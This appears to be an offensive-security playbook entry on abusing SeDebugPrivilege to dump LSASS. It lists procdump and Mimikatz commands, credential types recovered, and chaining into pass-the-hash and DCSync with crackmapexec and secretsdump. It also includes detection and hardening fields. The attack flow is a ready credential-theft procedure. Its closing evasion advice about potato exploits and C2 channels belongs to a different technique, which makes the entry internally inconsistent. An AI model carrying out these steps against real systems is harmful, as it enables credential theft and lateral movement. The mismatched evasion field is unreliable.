examples.label: Dump LSASS to disk with procdump
Load the dump in mimikatz offline

notes:
=== SeDebugPrivilege — LSASS Credential Dump ===
Use debug privilege to open a handle to LSASS and dump credentials for all logged-on users.

=== ATTACK FLOW ===
1. Confirm: whoami /priv → SeDebugPrivilege (may show Disabled — still exploitable in elevated shell)
2. Check LSASS protection:
   reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL
   RunAsPPL=1 → need driver bypass; RunAsPPL=0 → ProcDump works directly

3. Dump with ProcDump:
   .\procdump.exe -accepteula -ma lsass.exe lsass.dmp

4. Transfer dump to attack host (SMB or Python HTTP server)

5. Process with Mimikatz:
   mimikatz# log
   mimikatz# sekurlsa::minidump lsass.dmp
   mimikatz# sekurlsa::logonpasswords

=== ALTERNATIVE — TASK MANAGER (NO TOOL TRANSFER NEEDED) ===
Details tab → right-click lsass.exe → Create dump file
Produces identical dump → process with Mimikatz identically

=== CREDENTIAL TYPES RECOVERED ===
NTLM hashes → pass-the-hash to any SMB/WMI/RDP target
Kerberos tickets → pass-the-ticket, overpass-the-hash
Cleartext passwords → if WDigest enabled or on older OS (pre-Win8.1/2012R2)
WDigest check: reg query "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential

=== CHAINING CONTEXT ===
SeDebugPrivilege on dev account → LSASS dump → domain admin hash → DCSync or PTH
Same local admin NTLM hash across multiple hosts (gold image environments) = instant lateral movement
NTLM hash → crackmapexec smb 10.x.x.0/24 -H <hash> --local-auth → find all reuse targets
After LSASS dump → secretsdump -hashes :<NTLM> domain/user@DC_IP → domain-wide DCSync

=== WHAT TO LOOK FOR ===
SeDebugPrivilege assigned via GPO: Computer Settings > Security Settings > Local Policies > User Rights Assignment
Dev accounts often assigned for debugging system components — check non-admin dev accounts
Assigned-but-Disabled: still usable in elevated shell (UAC bypass may be needed first)

recommended.note: Same privilege used to spawn a SYSTEM process instead.

name: SeDebugPrivilege - Dump LSASS and Parse
description: SeDebugPrivilege lets you read LSASS memory. Dump it with ProcDump, then parse the minidump offline with Mimikatz to recover plaintext passwords and NTLM hashes.

defense.why_it_works: SeDebugPrivilege grants the ability to open any process (including SYSTEM processes) with PROCESS_ALL_ACCESS, bypassing normal DACL protections. ProcDump uses this privilege to create a memory dump of lsass.exe. Mimikatz sekurlsa::minidump then extracts NTLM hashes and Kerberos tickets from the dump offline, even without Mimikatz touching the live lsass process.
defense.prerequisites: SeDebugPrivilege in the current token (Administrators have it by default). ProcDump.exe available. Mimikatz or pypykatz for offline processing. The dump must not be blocked by PPL (Protected Process Light).
defense.impact: Extraction of all cached NTLM hashes, Kerberos tickets, and plaintext credentials (if WDigest is enabled) for all users with active sessions, enabling pass-the-hash attacks and lateral movement.
defense.detection: ProcDump accessing lsass.exe (Event ID 10 in Sysmon: process access to lsass). Large .dmp file creation. Windows Defender: LSASS access protection alert. EDR: credential dumping detection.
defense.artifacts: Process: procdump.exe accessing lsass.exe (Sysmon Event 10) | File: lsass.dmp created in temp directory | Process: mimikatz.exe offline processing | Security event: new process creation from procdump
defense.prevention: Enable Windows Defender Credential Guard — prevents extraction of NTLM hashes from memory. Enable PPL (Protected Process Light) for LSASS. Restrict SeDebugPrivilege: remove from Administrators in high-security environments. Deploy EDR with LSASS protection. Disable WDigest (disable plaintext password caching).
defense.misconfiguration: Credential Guard not enabled. LSASS PPL not enabled. WDigest enabled (Windows 7 default). No EDR monitoring LSASS access. SeDebugPrivilege available to all local admins without additional controls.
defense.vulnerable_config:
# Dump lsass with SeDebugPrivilege:
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Offline extraction:
mimikatz.exe
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
defense.secure_config:
# Enable Credential Guard:
# GPO: Computer Configuration > Admin Templates > System > Device Guard
# > Turn on Virtualization Based Security
# > Credential Guard Configuration = Enabled with UEFI lock

# Enable LSASS PPL:
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 1

# Disable WDigest:
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0
defense.evasion: Pick the potato that matches the OS (GodPotato for 2019/2022) to avoid crashes and alerts; run it in-memory; the SeImpersonate abuse itself is quiet — the noisy part is the spawned shell, so route it through an existing C2 channel.
